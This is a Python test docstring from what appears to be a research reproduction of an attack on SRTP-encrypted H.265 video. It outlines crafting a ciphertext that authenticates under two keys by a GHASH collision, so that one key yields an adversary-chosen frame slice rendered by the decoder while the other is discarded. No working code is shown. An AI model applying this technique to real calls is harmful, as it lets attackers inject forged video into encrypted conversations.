"""End-to-end round-trip test of Step 2.2 × Step 2.1:

Build the per-packet plaintext for a real H.265 NAL using
h265_nal.build_packet_plaintext(), generate an ambiguous SRTP-style
ciphertext under (K_OLD, K_NEW) using test_packet_ambiguous.
build_ambiguous_under_inner_keys() with the embedded adjustment offset,
then check both decryption paths:

  K_OLD branch:
    decrypt_and_verify succeeds → recovered bytes match the laid-out
    plaintext exactly → the very first NAL we feed into the H.265 NAL
    parser is byte-for-byte identical to the original adversary NAL,
    proving the decoder will render the adversary's content.

  K_NEW branch:
    decrypt_and_verify also succeeds (the GHASH collision arranges
    that), but the first 3 bytes are now pseudo-random — so the H.265
    parser either fails to find a start code 0x000001 at offset 0 or
    sees a malformed forbidden_zero_bit / forbidden type. Either way
    the packet is dropped by the depacketizer, matching paper §5.3
    Linphone Single-NAL-Unit valid-vs-discard semantics.

We pick a small-to-medium TRAIL_R NAL (the inter-frame slice payloads,
which dominate the stream and easily fit a 1300-byte MTU) as the
adversary NAL."""


